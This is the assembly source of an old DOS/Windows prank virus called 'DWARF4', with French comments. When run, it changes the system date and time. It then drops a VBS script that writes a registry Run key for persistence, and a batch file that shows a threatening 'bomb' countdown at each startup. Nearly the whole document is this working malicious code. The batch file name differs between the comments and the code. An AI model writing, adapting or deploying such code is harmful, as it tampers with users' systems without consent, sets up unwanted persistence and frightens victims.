;Par M.Xxxxxxx XXXXXXX (c)2000
;TAILLE : 1034 OCTETS
;DWARF4 MODIFIE LA DATE AU 26 DECEMBRE 1999
;C:\DWARF.VBS QUI AJOUTE UN CLE DANS LA BASE DE REGISTRE
;C:\WINDOWS\DWARF.BAT QUI AFFICHE UN LESSAGE A CHAQUE DEMARRAGE       

.model small
.code
org 100h




DATE:           mov ah,2Bh
                mov dh,12
                mov dl,26
                mov cx,1999
                int 21h                 ;26 DECEMBRE 1999
HEURE:          mov ah,2Dh
                xor cx,cx
                xor dx,dx
                int 21h                 ;MINUIT
FILE1:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM1
                int 21h                 ;création du 1er fichier
                xchg ax,bx
                mov ah,40h
                mov cx,progl1
                mov dx,offset prog1
                int 21h                 ;écriture
                mov ah,3Eh
                int 21h                 ;fermeture
FILE2:          mov ah,3Ch
                xor cx,cx
                mov dx,offset NOM2
                int 21h                 ;création du 2nd fichier
                xchg ax,bx
                mov ah,40h
                mov cx,progl2
                mov dx,offset prog2
                int 21h                 ;écriture
                mov ah,3Eh
                int 21h                 ;fermeture
MESSAGE:        mov ax,3
                int 10h
                mov ah,9
                lea dx,msg
                int 21h
FIN:            mov ah,4Ch
                int 21h

NOM1    db 'c:\dwarf.vbs',0
NOM2    db 'c:\WINDOWS\Panda.bat',0
prog1   db 'rem DwArF.vbs by Panda (c)2000',0Dh,0Ah
        db 'msgbox "BONNO JOURNEE ?"',0Dh,0Ah
        db 'Dim W',0Dh,0Ah
        db 'Set W = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
        db 'W.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows'
        db '\CurrentVersion\Run\DwArF", "C:\WINDOWS\dwarf.bat"'
progl1  equ $-prog1
prog2   db '@echo off',0Dh,0Ah
        db 'if exist c:\dwarf.vbs del c:\dwarf.vbs',0Dh,0Ah
        db 'cls',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo UNE BOMBE A ETE PLACE DANS TON ORDINATEUR',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo DANS 5 SECONDES TU VAS MOURIR',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'choice /c:Q /t:Q,5 /n Le compte … rebours a commencé',0Dh,0Ah
        db 'if errorlevel 1 goto Die',0Dh,0Ah
        db ':Die',0Dh,0Ah
        db 'cls',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo.',0Dh,0Ah
        db 'echo               ***    ***    ***   *   *',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  ** **',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  * * *',0Dh,0Ah
        db 'echo               * *   *   *  *   *  *   *',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  *   *',0Dh,0Ah
        db 'echo               *  *  *   *  *   *  *   *',0Dh,0Ah
        db 'echo               ***    ***    ***   *   *',0Dh,0Ah
progl2  equ $-prog2
CORBEILLE db 'C:\RECYCLED\*.*',0
msg     db 7,7,7,10,13,'UN FICHIER A ETE CREE',0Ah,0Ah,0Dh
        db 'IL SE NOMME C:\dwarf.vbs',10,10,13
        db 'OUVRE LE VITE $'

end DATE
